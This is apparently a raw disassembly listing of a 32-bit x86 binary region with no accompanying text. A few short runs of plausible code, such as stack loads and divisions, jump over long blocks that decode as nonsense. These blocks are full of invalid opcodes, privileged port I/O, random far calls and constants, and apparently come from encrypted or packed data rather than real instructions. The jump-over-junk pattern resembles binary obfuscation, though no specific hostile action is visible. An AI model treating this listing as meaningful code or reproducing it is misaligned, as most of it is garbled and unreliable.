  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	add    eax,0x2db0c1ec
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [ecx],dl
  40d2ff:	nop
  40d300:	lods   al,BYTE PTR ds:[esi]
  40d301:	xor    DWORD PTR [edx],esp
  40d303:	in     eax,dx
  40d304:	pop    ebx
  40d305:	cmp    al,BYTE PTR [eax+0x6e]
  40d308:	xchg   ebx,eax
  40d309:	loopne 0x40d367
  40d30b:	xchg   ebp,eax
  40d30c:	mov    eax,ds:0x6af57173
  40d311:	clc    
  40d312:	ins    DWORD PTR es:[edi],dx
  40d313:	sti    
  40d314:	and    ebx,DWORD PTR [edi-0x44c45806]
  40d31a:	jmp    0x3031bf7c
  40d31f:	clc    
  40d320:	push   ebp
  40d321:	and    cl,BYTE PTR [edi+0x2b]
  40d324:	daa    
  40d325:	cmp    al,0xf8
  40d327:	fstp   TBYTE PTR [edx]
  40d329:	mov    DWORD PTR [eax],ebp
  40d32b:	jne    0x40d321
  40d32d:	and    al,0x23
  40d32f:	test   eax,0xf5a3cb2
  40d334:	mov    dh,0x39
  40d336:	clc    
  40d337:	push   ebx
  40d338:	xor    ebx,esp
  40d33a:	scas   al,BYTE PTR es:[edi]
  40d33b:	clc    
  40d33c:	jl     0x40d3bd
  40d33e:	stos   DWORD PTR es:[edi],eax
  40d33f:	ror    DWORD PTR [ebx],cl
  40d341:	test   BYTE PTR [edx],al
  40d343:	dec    esp
  40d344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d345:	pop    es
  40d346:	dec    ecx
  40d347:	fiadd  WORD PTR [ecx]
  40d349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d34a:	or     ebx,DWORD PTR [edx]
  40d34c:	dec    edi
  40d34d:	test   eax,0x153209dd
  40d352:	mov    ebp,0x2d9ef7d8
  40d357:	sbb    DWORD PTR [ebp-0x20],eax
  40d35a:	sub    al,0x99
  40d35c:	inc    ecx
  40d35d:	or     al,0xa7
  40d35f:	fdivrp st(7),st
  40d361:	fpatan 
  40d363:	aas    
  40d364:	fs pop edi
  40d366:	cmp    al,0xca
  40d368:	test   BYTE PTR [esi+0x27],cl
  40d36b:	lea    ebp,[edi-0x66]
  40d36e:	adc    edx,eax
  40d370:	test   al,0x1d
  40d372:	and    eax,0x367f20c3
  40d377:	add    eax,0xad9b9bca
  40d37c:	(bad)  
  40d37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d37e:	(bad)  
  40d37f:	(bad)  
  40d380:	adc    DWORD PTR [eax],ebx
  40d382:	fsub   DWORD PTR [eax]
  40d384:	lods   al,BYTE PTR ds:[esi]
  40d385:	or     dl,BYTE PTR [ebp-0x7b5bc9fc]
  40d38b:	int    0x38
  40d38d:	call   0x1b5:0x4d05a77a
  40d394:	sub    edx,DWORD PTR [ecx+0x592b7007]
  40d39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39b:	cmovo  esi,DWORD PTR [edi+0xa]
  40d39f:	and    al,bl
  40d3a1:	mov    eax,ds:0xa6b4c982
  40d3a6:	inc    ecx
  40d3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3a8:	lds    esp,FWORD PTR [edx+0x7b]
  40d3ab:	xor    cl,BYTE PTR [edi-0x311fa235]
  40d3b1:	mov    ecx,0xd44a4310
  40d3b6:	jp     0x40d3cb
  40d3b8:	xchg   edi,eax
  40d3b9:	loopne 0x40d3ea
  40d3bb:	push   edx
  40d3bc:	lahf   
  40d3bd:	xchg   ecx,eax
  40d3be:	ins    DWORD PTR es:[edi],dx
  40d3bf:	xor    BYTE PTR [edx+0x74372472],0x34
  40d3c6:	cwde   
  40d3c7:	ror    DWORD PTR [eax],1
  40d3c9:	dec    esi
  40d3ca:	add    eax,0x2f15183
  40d3cf:	in     eax,0xe1
  40d3d1:	pop    edx
  40d3d2:	lahf   
  40d3d3:	inc    edx
  40d3d4:	gs out dx,eax
  40d3d6:	cmp    eax,0x5f3bfb4c
  40d3db:	(bad)
  40d3df:	inc    edi
  40d3e0:	dec    esi
  40d3e1:	adc    edx,DWORD PTR [ecx+0x49809664]
  40d3e7:	lods   eax,DWORD PTR ds:[esi]
  40d3e8:	and    edx,DWORD PTR [esi]
  40d3ea:	mov    ds,esp
  40d3ec:	mov    ds,WORD PTR [esi+0x68]
  40d3ef:	int    0x63
  40d3f1:	mov    ch,al
  40d3f3:	repnz pop eax
  40d3f5:	jo     0x40d3b4
  40d3f7:	push   0x67
  40d3f9:	adc    DWORD PTR [ebx],ebp
  40d3fb:	ins    DWORD PTR es:[edi],dx
  40d3fc:	test   al,0x4e
  40d3fe:	or     BYTE PTR [ecx+0x42],0xb5
  40d402:	pop    ecx
  40d403:	shl    al,1
  40d405:	mov    edi,0x4ef0a5d5
  40d40a:	or     dh,dh
  40d40c:	xor    eax,0xa0428c77
  40d411:	push   es
  40d412:	imul   BYTE PTR [ebp-0x4d]
  40d415:	xor    eax,0x423ae82
  40d41a:	jbe    0x40d3d5
  40d41c:	loope  0x40d3b2
  40d41e:	lods   eax,DWORD PTR ds:[esi]
  40d41f:	jae    0x40d422
  40d421:	xchg   DWORD PTR [ebp+0x1d],edi
  40d424:	stc    
  40d425:	mov    esp,0xcf6ac6ff
  40d42a:	adc    eax,0x1f342109
  40d42f:	sub    bl,BYTE PTR ds:0xbc5f232e
  40d435:	mov    dl,0x56
  40d437:	and    ecx,DWORD PTR [esi+ecx*2-0x61]
  40d43b:	out    0x13,al
  40d43d:	mov    al,0x9f
  40d43f:	mov    al,ds:0x9dd280e5
  40d444:	cmp    BYTE PTR gs:[ecx-0x48],bl
  40d448:	adc    DWORD PTR [ecx+0x347cabdb],0x3
  40d44f:	lds    ebp,FWORD PTR [edx]
  40d451:	xchg   esi,eax
  40d452:	mov    WORD PTR [eax+0x7257149a],ss
  40d458:	inc    esp
  40d459:	aam    0x1
  40d45b:	(bad)  
  40d45c:	mov    al,ds:0x161dd3f1
  40d461:	rcr    DWORD PTR [bp+0x2a],1
  40d465:	xchg   edx,eax
  40d466:	or     BYTE PTR [edx-0x80],cl
  40d469:	xor    BYTE PTR [edi-0x4423707c],bh
  40d46f:	dec    edx
  40d470:	iret   
  40d471:	or     ch,BYTE PTR [esi]
  40d473:	add    BYTE PTR [ebx+0x1f],bl
  40d476:	xor    ch,bh
  40d478:	dec    ecx
  40d479:	int    0x40
  40d47b:	and    esi,ebp
  40d47d:	js     0x40d424
  40d47f:	fnstsw WORD PTR [ecx-0x22092786]
  40d485:	push   ecx
  40d486:	and    DWORD PTR [ecx+0x652e315f],ecx
  40d48c:	scas   eax,DWORD PTR es:[edi]
  40d48d:	es jbe 0x40d4fd
  40d490:	add    ecx,DWORD PTR [eax]
  40d492:	inc    ecx
  40d493:	mov    bl,0x86
  40d495:	cld    
  40d496:	(bad)  
  40d497:	fiadd  WORD PTR [ecx*1-0x462b801e]
  40d49e:	and    al,0xc4
  40d4a0:	adc    bl,BYTE PTR [edi]
  40d4a2:	push   cs
  40d4a3:	in     eax,0xda
  40d4a5:	ins    BYTE PTR es:[edi],dx
  40d4a6:	sbb    bh,BYTE PTR ds:0x54a3c83a
  40d4ac:	dec    edi
  40d4ad:	popa   
  40d4ae:	xchg   BYTE PTR [esi+edx*2],cl
  40d4b1:	cmp    eax,edi
  40d4b3:	mov    ebp,0x32b40333
  40d4b8:	add    ebx,esi
  40d4ba:	mov    ds:0x783ee129,eax
  40d4bf:	cmp    esp,ecx
  40d4c1:	repz add eax,0x8666d04b
  40d4c7:	sub    eax,0xf5d811e7
  40d4cc:	pop    edx
  40d4cd:	enter  0x9582,0x5f
  40d4d1:	fidiv  DWORD PTR [edi+0x6]
  40d4d4:	lds    edi,FWORD PTR [eax+0x37ef90d4]
  40d4da:	or     al,0x16
  40d4dc:	dec    ebx
  40d4dd:	gs (bad) 
  40d4df:	sbb    ebp,esp
  40d4e1:	mov    dh,0xfb
  40d4e3:	clc    
  40d4e4:	in     eax,dx
  40d4e5:	pop    edx
  40d4e6:	test   eax,0x1bdae8ae
  40d4eb:	test   BYTE PTR [eax+ebp*1+0x12],bh
  40d4ef:	ret    
  40d4f0:	fcmovb st,st(2)
  40d4f2:	clc    
  40d4f3:	jl     0x40d551
  40d4f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f6:	mov    dl,0xb7
  40d4f8:	mov    ds:0x408bb11a,eax
  40d4fd:	xor    DWORD PTR [edi-0x13dd513d],esi
  40d503:	mov    ah,0xdc
  40d505:	mov    ds:0x98762e7b,eax
  40d50a:	xlat   BYTE PTR ds:[ebx]
  40d50b:	mov    bh,0xae
  40d50d:	sbb    ch,0xb5
  40d510:	fdiv   st(7),st
  40d512:	mov    edx,DWORD PTR [ebx+0x67eec073]
  40d518:	hlt    
  40d519:	popa   
  40d51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d51b:	dec    esi
  40d51c:	mov    eax,0x2d97263e
  40d521:	outs   dx,DWORD PTR ds:[esi]
  40d522:	cs push ss
  40d524:	fmul   QWORD PTR [edx]
  40d526:	scas   eax,DWORD PTR es:[edi]
  40d527:	fwait
  40d528:	data16 es rsm 
  40d52c:	das    
  40d52d:	inc    edx
  40d52e:	addr16 loope 0x40d555
  40d531:	fxch   st(3)
  40d533:	adc    al,0x85
  40d535:	test   DWORD PTR [ebx-0x4545f839],0x4c387ee4
  40d53f:	repnz test BYTE PTR [edx+edi*8-0x7c],ch
  40d544:	out    dx,al
  40d545:	cmp    BYTE PTR [edi+0x4c],al
  40d548:	sbb    eax,0xe62763a0
  40d54d:	inc    DWORD PTR [ebx+0x194e549]
  40d553:	mov    ch,BYTE PTR ds:0xf4d8d732
  40d559:	cs push es
  40d55b:	loopne 0x40d5bb
  40d55d:	pop    ecx
  40d55e:	xor    BYTE PTR [ecx+0x20],dh
  40d561:	jecxz  0x40d58b
  40d563:	pusha  
  40d564:	imul   ebx,ebx,0xffffffc0
  40d567:	std    
  40d568:	mov    bl,0x3a
  40d56a:	(bad)  
  40d56b:	dec    ecx
  40d56c:	or     DWORD PTR [ecx],0xffffffb4
  40d56f:	xchg   ebp,eax
  40d570:	cs cmp al,0xd
  40d573:	not    esi
  40d575:	jbe    0x40d577
  40d577:	sub    al,0xe3
  40d579:	in     eax,0x9d
  40d57b:	or     eax,ebx
  40d57d:	stos   DWORD PTR es:[edi],eax
  40d57e:	fcmovnbe st,st(3)
  40d580:	(bad)  
  40d582:	das    
  40d583:	inc    ecx
  40d584:	imul   eax,DWORD PTR [ebx],0x76
  40d587:	inc    eax
  40d588:	push   0xa8584e91
  40d58d:	aaa    
  40d58e:	add    esi,DWORD PTR ds:[esi]
  40d591:	(bad)  
  40d592:	rcl    BYTE PTR [ebx-0x117abf9f],0x52
  40d599:	push   ss
  40d59a:	call   0x38cc:0xdbbca356
  40d5a1:	push   ebp
  40d5a2:	adc    eax,0x4d8b1f59
  40d5a7:	loopne 0x40d5dc
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	out    0x2,eax
  40d5bd:	dec    edi
  40d5be:	jle    0x40d5a7
  40d5c0:	fcomp  QWORD PTR [eax]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [esi-0x5d080a4c],al
  40d5cc:	mov    ds:0x763f8577,eax
  40d5d1:	mov    DWORD PTR [esi+0x4a],ebx
  40d5d4:	pushf  
  40d5d5:	and    eax,DWORD PTR [ebx+0x21]
  40d5d8:	retf   0xfb82
  40d5db:	out    dx,eax
  40d5dc:	cmc    
  40d5dd:	in     al,0x49
  40d5df:	push   0xffffffe1
  40d5e1:	in     eax,dx
  40d5e2:	lods   al,BYTE PTR ds:[esi]
  40d5e3:	aaa    
  40d5e4:	aas    
  40d5e5:	cwde   
  40d5e6:	and    eax,DWORD PTR [edx]
  40d5e8:	lods   eax,DWORD PTR ds:[esi]
  40d5e9:	test   al,0x8a
  40d5eb:	cmp    DWORD PTR [eax],0xffffffb8
  40d5ee:	add    eax,0xe6408dba
  40d5f3:	inc    eax
  40d5f4:	xchg   ecx,eax
  40d5f5:	rcl    BYTE PTR [ebx],cl
  40d5f7:	pop    esp
  40d5f8:	(bad)  [ebx*4+0x77e67572]
  40d5ff:	pop    esi
  40d600:	dec    eax
  40d601:	jp     0x40d656
  40d603:	or     DWORD PTR [eax],edi
  40d605:	pusha  
  40d606:	stos   DWORD PTR es:[edi],eax
  40d607:	lods   eax,DWORD PTR ds:[esi]
  40d608:	lea    ebx,[ebp+0x497b0588]
  40d60e:	ins    BYTE PTR es:[edi],dx
  40d60f:	push   ss
  40d610:	out    0x32,eax
  40d612:	push   0x51a653cd
  40d617:	jg     0x40d669
  40d619:	adc    al,0xef
  40d61b:	sahf   
  40d61c:	inc    esp
  40d61d:	stc    
  40d61e:	cwde   
  40d61f:	rol    BYTE PTR [ebx+0x2a9c1e46],0xa9
  40d626:	cmp    DWORD PTR [eax-0x5c06f647],eax
  40d62c:	das    
  40d62d:	(bad)  
  40d62e:	imul   eax,DWORD PTR [eax+0x1a7b7c34],0x19
  40d635:	add    bh,BYTE PTR [esi+0x6c]
  40d638:	add    ebp,esp
  40d63a:	push   edi
  40d63b:	ss out 0x45,al
  40d63e:	cwde   
  40d63f:	or     al,0x94
  40d641:	xchg   edi,eax
  40d642:	fist   WORD PTR [eax-0x4a3472ea]
  40d648:	fidivr DWORD PTR [esi+0x6f]
  40d64b:	lea    esi,[eax-0x62]
  40d64e:	shl    BYTE PTR [ebp-0x55],cl
  40d651:	pop    esi
  40d652:	sbb    BYTE PTR [edi+0x6863e320],al
  40d658:	adc    eax,0xb026de95
  40d65d:	sub    DWORD PTR [ecx],ebp
  40d65f:	pop    edi
  40d660:	or     ebx,ecx
  40d662:	sub    eax,0x19cf8939
  40d667:	stc    
  40d668:	jl     0x40d61f
  40d66a:	in     eax,dx
  40d66b:	xlat   BYTE PTR ds:[ebx]
  40d66c:	fst    DWORD PTR [edx+0x7e]
  40d66f:	pop    edi
  40d670:	int    0xa6
  40d672:	sub    ebx,DWORD PTR [eax+esi*2]
  40d675:	push   cs
  40d676:	bswap  esi
  40d678:	call   0xe9451b67
  40d67d:	ret    0xc7be
  40d680:	pextrw esi,mm1,0xcf
  40d684:	xchg   edx,eax
  40d685:	(bad)  
  40d686:	out    dx,eax
  40d687:	cmp    ebx,esp
  40d689:	std    
  40d68a:	sahf   
  40d68b:	sub    al,0x9f
  40d68d:	add    ebx,edi
  40d68f:	mov    ebp,DWORD PTR [edi-0x32897663]
  40d695:	aam    0xd7
  40d697:	and    ch,al
  40d699:	jnp    0x40d658
  40d69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d69c:	test   bh,bh
  40d69e:	pop    esp
  40d69f:	sub    al,0x88
  40d6a1:	pop    ebx
  40d6a2:	xchg   ebx,eax
  40d6a3:	jmp    0x40d6bf
  40d6a5:	and    bh,BYTE PTR [edx]
  40d6a7:	push   ebx
  40d6a8:	cmp    eax,0x81057332
  40d6ad:	(bad)  
  40d6ae:	aas    
  40d6af:	dec    esi
  40d6b0:	inc    ecx
  40d6b1:	icebp  
  40d6b2:	pop    es
  40d6b3:	inc    eax
  40d6b4:	sbb    BYTE PTR [edi],ch
  40d6b6:	pop    edx
  40d6b7:	in     al,dx
  40d6b8:	test   DWORD PTR [edi],esi
  40d6ba:	mov    cl,0x31
  40d6bc:	xchg   ebx,eax
  40d6bd:	shl    ebx,cl
  40d6bf:	div    DWORD PTR [edx-0x5b]
  40d6c2:	ins    DWORD PTR es:[edi],dx
  40d6c3:	test   bh,al
  40d6c5:	push   es
  40d6c6:	ja     0x40d6e9
  40d6c8:	stc    
  40d6c9:	mov    ds:0xb19f908b,al
  40d6ce:	dec    esp
  40d6cf:	popa   
  40d6d0:	push   eax
  40d6d1:	test   eax,0xb13fdb35
  40d6d6:	jmp    0x40d672
  40d6d8:	mov    ebx,0x9bdb30e1
  40d6dd:	mul    BYTE PTR [ebp-0x3e]
  40d6e0:	fiadd  WORD PTR [ebx-0x7f8427b1]
  40d6e6:	ja     0x40d67d
  40d6e8:	sub    eax,DWORD PTR [edi+0x3c]
  40d6eb:	pop    esp
  40d6ec:	sbb    DWORD PTR [esi+0x79b062ba],ebx
  40d6f2:	jp     0x40d718
  40d6f4:	inc    edx
  40d6f5:	push   es
  40d6f6:	in     al,dx
  40d6f7:	push   esp
  40d6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6f9:	cmp    al,0x1a
  40d6fb:	jle    0x40d6a9
  40d6fd:	shl    esi,cl
  40d6ff:	test   eax,0x13a51829
  40d704:	rol    BYTE PTR [esi-0x1ae3bc70],0x28
  40d70b:	sub    al,0x12
  40d70d:	pop    es
  40d70e:	xor    eax,0x9d5a62c5
  40d713:	dec    ecx
  40d714:	fsubr  st(7),st
  40d716:	loope  0x40d6a7
  40d718:	adc    bh,dh
  40d71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d71b:	cdq    
  40d71c:	pop    ss
  40d71d:	shr    BYTE PTR [edi-0x39],0x9c
  40d721:	ds push 0x584ad89f
  40d727:	outs   dx,DWORD PTR ds:[esi]
  40d728:	xchg   ebp,eax
  40d729:	enter  0x5bf7,0x52
  40d72d:	pop    eax
  40d72e:	outs   dx,DWORD PTR ds:[esi]
  40d72f:	jbe    0x40d77b
  40d731:	cmp    al,0xe4
  40d733:	data16 fild WORD PTR [edx+0x8]
  40d737:	sub    DWORD PTR [eax-0x384c123],ebp
  40d73d:	loop   0x40d7b5
  40d73f:	mov    esp,0xa0f76d86
  40d744:	jmp    0xf946077b
  40d749:	fmul   QWORD PTR [eax]
  40d74b:	cmp    edi,DWORD PTR [ebp+0x6]
  40d74e:	lods   al,BYTE PTR ds:[esi]
  40d74f:	xor    dh,BYTE PTR [edi]
  40d751:	jns    0x40d6de
  40d753:	cmp    edx,DWORD PTR [eax-0x63]
  40d756:	add    eax,0x7aaaf47c
  40d75b:	inc    ebx
  40d75c:	jge    0x40d741
  40d75e:	jp     0x40d7b9
  40d760:	sbb    al,0xa3
  40d762:	mov    al,ds:0x6b390107
  40d767:	sub    al,0xf5
  40d769:	loopne 0x40d7c3
  40d76b:	or     DWORD PTR [edi+ecx*2-0x7bef2879],ecx
  40d772:	sti    
  40d773:	aad    0xec
  40d775:	jno    0x40d72f
  40d777:	push   cs
  40d778:	add    esp,DWORD PTR [ebp+0x8]
  40d77b:	inc    esi
  40d77c:	arpl   WORD PTR [ecx+0x66],dx
  40d77f:	popf   
  40d780:	push   ds
  40d781:	sub    ebx,ebx
  40d783:	aam    0xad
  40d785:	das    
  40d786:	adc    ebp,ebx
  40d788:	outs   dx,BYTE PTR ds:[esi]
  40d789:	lods   al,BYTE PTR ds:[esi]
  40d78a:	(bad)  
  40d78b:	jo     0x40d807
  40d78d:	aad    0x4
  40d78f:	mov    edi,0x53da4912
  40d794:	mov    edi,0x4e825cd8
  40d799:	push   esp
  40d79a:	cmp    DWORD PTR [esi+0x5a9c31a0],eax
  40d7a0:	sbb    dl,ch
  40d7a2:	mov    esi,0xf5f80a50
  40d7a7:	ja     0x40d7cb
  40d7a9:	xchg   esp,eax
  40d7aa:	sbb    BYTE PTR [ebp-0x49],al
  40d7ad:	jne    0x40d81b
  40d7af:	call   0xb51b:0xda6f665f
  40d7b6:	sbb    al,0xaa
  40d7b8:	cmp    al,0x2a
  40d7ba:	(bad)  
  40d7bb:	sbb    al,0xb6
  40d7bd:	cmp    BYTE PTR [ecx+0x2fcaaf51],dh
  40d7c3:	xor    ebx,eax
  40d7c5:	and    al,0xf
  40d7c8:	and    ecx,DWORD PTR [eax-0x168b829b]
  40d7ce:	adc    DWORD PTR [ecx+0x437570e8],0xffffffe9
  40d7d5:	pop    ds
  40d7d6:	icebp  
  40d7d7:	daa    
  40d7d8:	pop    es
  40d7d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7da:	sbb    esi,DWORD PTR ds:0x7769f601
  40d7e0:	cld    
  40d7e1:	retf   0x2a12
  40d7e4:	into   
  40d7e5:	cmp    al,0xfc
  40d7e7:	adc    DWORD PTR [ecx-0x24],edx
  40d7ea:	sub    esp,DWORD PTR [ebp-0x42]
  40d7ed:	add    al,0xc5
  40d7ef:	into   
  40d7f0:	lds    esi,FWORD PTR [ebx+esi*2+0x4ea423e8]
  40d7f7:	hlt    
  40d7f8:	not    BYTE PTR [eax-0x5]
  40d7fb:	jle    0x40d7b2
  40d7fd:	adc    ebx,DWORD PTR [ebp-0x9]
  40d800:	dec    esp
  40d801:	add    eax,0xfff787ef
  40d806:	stos   BYTE PTR es:[edi],al
  40d807:	jle    0x40d7da
  40d809:	les    esi,FWORD PTR ds:0x4fab369e
  40d80f:	push   ebx
  40d810:	xchg   edi,eax
  40d811:	repz loop 0x40d818
  40d814:	push   es
  40d815:	mov    dl,0xdb
  40d817:	push   edx
  40d818:	mov    al,0xab
  40d81a:	xor    al,0x78
  40d81c:	repnz test al,0x5b
  40d81f:	pop    eax
  40d820:	mov    ds:0x6718eef,al
  40d825:	jb     0x40d834
  40d827:	xor    esi,DWORD PTR [edx-0x2880256]
  40d82d:	or     dl,0x99
  40d830:	popf   
  40d831:	mov    edx,0x96140e96
  40d836:	mov    DWORD PTR [edi+0x61],ebp
  40d839:	hlt    
  40d83a:	cdq    
  40d83b:	push   ecx
  40d83c:	adc    eax,0xa8a6627
  40d841:	and    bh,BYTE PTR [eax-0x54235c18]
  40d847:	mov    al,ds:0xf9d965e4
  40d84c:	fadd   st(3),st
  40d84e:	bound  edx,QWORD PTR [edx-0x44]
  40d851:	cmp    eax,0x3d6767bd
  40d856:	cli    
  40d857:	imul   edi,DWORD PTR [eax-0x1],0xffffff9e
  40d85b:	xlat   BYTE PTR ds:[ebx]
  40d85c:	mov    ch,0x37
  40d85e:	add    al,0x46
  40d860:	aaa    
  40d861:	push   0x5b
  40d863:	push   esp
  40d864:	mov    esi,0x50dd3acc
  40d869:	dec    ebp
  40d86a:	(bad)  
  40d86c:	stos   BYTE PTR es:[edi],al
  40d86d:	les    edi,FWORD PTR [edi+0x4db5]
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xddd93abc
  40d894:	jle    0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    dh,dh
  40d89e:	fistp  WORD PTR ds:0x755de9f9
  40d8a4:	lods   al,BYTE PTR ds:[esi]
  40d8a5:	loop   0x40d918
  40d8a7:	jle    0x40d858
  40d8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ab:	add    DWORD PTR [eax+0x48c2b44a],edi
  40d8b1:	cmp    dl,0x8a
  40d8b4:	mov    ss,WORD PTR [ecx]
  40d8b6:	jo     0x40d869
  40d8b8:	mov    cl,0x32
  40d8ba:	mov    al,ds:0x48545f2c
  40d8bf:	and    DWORD PTR [ebp-0x36fc667d],edx
  40d8c5:	retf   
  40d8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c7:	enter  0x1bbe,0xf3
  40d8cb:	xchg   esi,eax
  40d8cc:	jb     0x40d8cc
  40d8ce:	or     al,0xf9
  40d8d0:	xor    ebp,DWORD PTR [ebx-0x40]
  40d8d3:	add    ecx,ecx
  40d8d5:	jecxz  0x40d8f8
  40d8d7:	stos   DWORD PTR es:[edi],eax
  40d8d8:	rol    BYTE PTR [eax+0x47],0xf9
  40d8dc:	in     al,0x77
  40d8de:	jecxz  0x40d95d
  40d8e0:	sbb    al,0x34
  40d8e2:	bound  edi,QWORD PTR [esi-0x7f]
  40d8e5:	pop    ss
  40d8e6:	(bad)  [ecx+0x71aa96b]
  40d8ec:	call   0xbd60:0x629b4357
  40d8f3:	push   esp
  40d8f4:	out    0xec,al
  40d8f6:	mov    ah,dl
  40d8f8:	sar    DWORD PTR [ebp-0x290e44fb],0x6
  40d8ff:	call   0xe8718ae4
  40d904:	pop    esp
  40d905:	mov    ebp,0x4326b62b
  40d90a:	dec    eax
  40d90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90c:	dec    edx
  40d90d:	stc    
  40d90e:	(bad)  
  40d90f:	out    dx,eax
  40d910:	test   DWORD PTR [edi+0x49],edx
  40d913:	sti    
  40d914:	mov    esi,0x2cad731d
  40d919:	add    edi,DWORD PTR [ebx-0x31]
  40d91c:	(bad)  
  40d91d:	call   FWORD PTR [esi-0x2e]
  40d920:	jge    0x40d8f2
  40d922:	inc    esp
  40d923:	test   ebx,edi
  40d925:	cmp    al,0xc7
  40d927:	or     al,0x36
  40d929:	xor    esi,DWORD PTR [edi+ebp*1+0x1f]
  40d92d:	std    
  40d92e:	enter  0x4cda,0xb
  40d932:	paddsw mm1,mm6
  40d935:	mov    edx,0x8354e476
  40d93a:	xor    BYTE PTR [ebp+0x44],bh
  40d93d:	ins    DWORD PTR es:[edi],dx
  40d93e:	adc    DWORD PTR ds:0x6e975e25,edx
  40d944:	add    eax,0x67648bc7
  40d949:	int3   
  40d94a:	loopne 0x40d8d0
  40d94c:	out    0xdf,al
  40d94e:	loop   0x40d93a
  40d950:	adc    bh,dh
  40d952:	jp     0x40d90e
  40d954:	ret    
  40d955:	test   DWORD PTR [edx+edi*2+0x45],eax
  40d959:	leave  
  40d95a:	(bad)  [esi+0x3]
  40d95d:	jmp    0x40d97e
  40d95f:	inc    edi
  40d960:	mov    DWORD PTR [ecx-0x414c86f8],eax
  40d966:	out    dx,eax
  40d967:	repnz fwait
  40d969:	push   cs
  40d96a:	mov    cl,0x4e
  40d96c:	shl    BYTE PTR ds:0xcae8bd51,cl
  40d972:	jb     0x40d99b
  40d974:	popa   
  40d975:	sbb    esp,esi
  40d977:	inc    eax
  40d978:	rcl    DWORD PTR [edi+edi*4],cl
  40d97b:	mov    al,0x4
  40d97d:	loope  0x40d905
  40d97f:	mov    dl,0x2c
  40d981:	mov    esp,0xf96b99c6
  40d986:	inc    edi
  40d987:	ja     0x40d988
  40d989:	mov    ds:0x70b70543,eax
  40d98e:	mov    edx,0xc5aaa2b5
  40d993:	jne    0x40d939
  40d995:	jle    0x40d92a
  40d997:	cli    
  40d998:	int3   
  40d999:	inc    esi
  40d99a:	jg     0x40d9ef
  40d99c:	pop    esp
  40d99d:	fldenv [esi+0x5d5f46cd]
  40d9a3:	mov    edi,0x4c065bc2
  40d9a8:	or     al,0xaf
  40d9aa:	add    eax,0x23c5a22e
  40d9af:	ss ret 0x4c3a
  40d9b3:	(bad)  
  40d9b4:	ins    DWORD PTR es:[edi],dx
  40d9b5:	test   BYTE PTR [si+0x66],ch
  40d9b9:	popf   
  40d9ba:	jl     0x40d9ea
  40d9bc:	adc    cl,cl
  40d9be:	out    0x10,eax
  40d9c0:	int3   
  40d9c1:	imul   eax,edi,0xffffffbd
  40d9c4:	les    eax,FWORD PTR [ebx]
  40d9c6:	mov    cs,WORD PTR [ecx]
  40d9c8:	mov    BYTE PTR [ebx+ecx*4+0x3],dl
  40d9cc:	popa   
  40d9cd:	xor    ah,dh
  40d9cf:	repnz push ecx
  40d9d1:	lods   al,BYTE PTR ds:[esi]
  40d9d2:	push   edx
  40d9d3:	xor    ebp,DWORD PTR [ecx+edi*4]
  40d9d6:	test   BYTE PTR [ecx-0x39],bh
  40d9d9:	cmp    DWORD PTR [eax],0x2e
  40d9dc:	into   
  40d9dd:	pop    edx
  40d9de:	lods   eax,DWORD PTR ds:[esi]
  40d9df:	push   esi
  40d9e0:	inc    ebx
  40d9e2:	int3   
  40d9e3:	mov    ebp,0x4f216dc8
  40d9e8:	imul   edi,DWORD PTR [eax+edi*4+0x381fed90],0xbd96a655
  40d9f3:	inc    eax
  40d9f4:	in     eax,0x0
  40d9f6:	or     BYTE PTR [edi],0x39
  40d9f9:	mov    al,0xc9
  40d9fb:	fdivr  QWORD PTR [ebp-0x22822f56]
  40da01:	adc    eax,0x5ddbe6f7
  40da06:	adc    al,0xcf
  40da08:	dec    ebx
  40da09:	mov    cl,0x3b
  40da0b:	sbb    al,0x41
  40da0d:	pop    edi
  40da0e:	or     eax,0xa1367e18
  40da13:	hlt    
  40da14:	jbe    0x40da4a
  40da16:	out    dx,al
  40da17:	pop    edi
